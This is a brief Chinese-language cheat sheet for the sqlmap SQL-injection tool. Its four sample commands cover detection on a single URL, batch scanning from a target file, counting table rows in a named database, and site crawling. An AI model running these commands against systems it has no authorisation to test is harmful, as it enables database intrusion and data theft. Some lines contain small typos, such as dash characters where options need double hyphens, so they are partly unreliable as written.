## SQLMAP速查
### 使用技巧
### 基础检测语法
```Bash
sqlmap.py -u  http://127.0.0.1/user_info.php?uid=1 024
```
### 批量检测
```Bash
"sqlmap.py -m target.txt"
```
### 获取表中的数据个数
```Bash
sqlmap.py -u "http://www.potian.com/sqlmap/mssql/iis/get_int.asp?id=1" –count -Dtestdb
```
### 站点爬取
```Bash
sqlmap.py -u "http://www.secbang.com" –batch –crawl=3
```